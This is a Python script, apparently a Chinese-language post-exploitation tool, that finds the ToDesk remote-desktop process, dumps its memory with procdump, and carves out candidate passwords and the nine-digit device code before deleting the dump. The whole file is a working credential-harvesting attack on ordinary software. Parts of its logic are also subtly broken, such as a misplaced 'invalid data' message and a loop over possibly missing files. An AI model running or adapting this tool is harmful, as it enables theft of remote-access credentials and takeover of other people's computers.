import subprocess
import os
import glob
import datetime
import re
import pyfiglet

def find_todesk_process_with_missing_service():
    result = subprocess.run(['tasklist', '/svc'], capture_output=True, text=True)
    for line in result.stdout.splitlines():
        if 'ToDesk.exe' in line and '暂缺' in line:
            parts = line.split()
            pid = parts[1]
            print(f'找到 ToDesk.exe 含有信息的进程 ID: {pid}')
            return int(pid)
    else:
        print('未找到 ToDesk.exe 含有信息的进程。')
        return

def dump_process_memory(pid):
    procdump_path = os.path.join(os.getcwd(), 'procdump.exe')
    command = [procdump_path, '-accepteula', '-ma', str(pid)]
    subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    dump_files = glob.glob(os.path.join(os.getcwd(), 'ToDesk.exe_*.dmp'))
    if not dump_files:
        print('未找到生成的内存文件。')
        return
    return dump_files

def extract_content(file_path, date_str):
    found_date = False
    extracted_content = ''
    with open(file_path, 'rb') as f:
        while (chunk := f.read(4096)):
            ascii_content = chunk.decode(errors='ignore')
            if date_str in ascii_content and (not found_date):
                found_date = True
                date_index = ascii_content.index(date_str)
                start_index = max(0, date_index - 300)
                hex_content = ascii_content[start_index:date_index]
                hex_representation = hex_content.encode('utf-8').hex()
                extracted_content = ascii_content[date_index + len(date_str) + 6:]
                break
    if found_date:
        ascii_output = hex_to_ascii(hex_representation)
        all_asciis = '\n'.join(ascii_output)
        extract_values_by_position(all_asciis)
        match = re.search('(\\d{9})', extracted_content)
        if match:
            nine_digits = match.group(1)
            print(f'设备代码: {nine_digits}')
        else:
            print('未找到设备代码。')
    else:
        print('未找到信息。')

def hex_to_ascii(hex_string):
    segments = hex_string.split('00')
    results = []
    for segment in segments:
        segment = segment.strip()
        if segment:
            if all((c in '0123456789abcdefABCDEF' for c in segment)):
                try:
                    bytes_data = bytes.fromhex(segment)
                    ascii_characters = ''.join((chr(b) for b in bytes_data if 32 <= b <= 126))
                    if ascii_characters:
                        results.append(ascii_characters)
                except ValueError as e:
                    print('遇到异常！')
            print('无效数据，完蛋！')
    return results

def extract_values_by_position(ascii_output):
    lines = ascii_output.strip().split('\n')
    for index, line in enumerate(lines):
        print(f'可能的密码{index}: {line.strip()}')
import pyfiglet

def banner():
    banner_output = "\n\n'    _            _           _    \n'   | |          | |         | |   \n'   | |_ ___   __| | ___  ___| | __\n'   | __/ _ \\ / _` |/ _ \\/ __| |/ /\n'   | || (_) | (_| |  __/\\__ \\   < \n'    \\__\\___/ \\__,_|\\___||___/_|\\_'                                  \n'                                  \n todesk信息搜寻工具1.0     by 把回忆拼好丢了\n ---------------------------------------------\n"
    print(banner_output)
if __name__ == '__main__':
    banner()
    today = datetime.datetime.now().strftime('%Y%m%d')
    pid = find_todesk_process_with_missing_service()
    if pid:
        dump_files = dump_process_memory(pid)
        if dump_files:
            for dump_file in dump_files:
                extract_content(dump_file, today)
        for dump_file in dump_files:
            try:
                os.remove(dump_file)
                print('程序已完成')
            except Exception as e:
                print(f'删除内存文件 {dump_file} 时出错: {e}')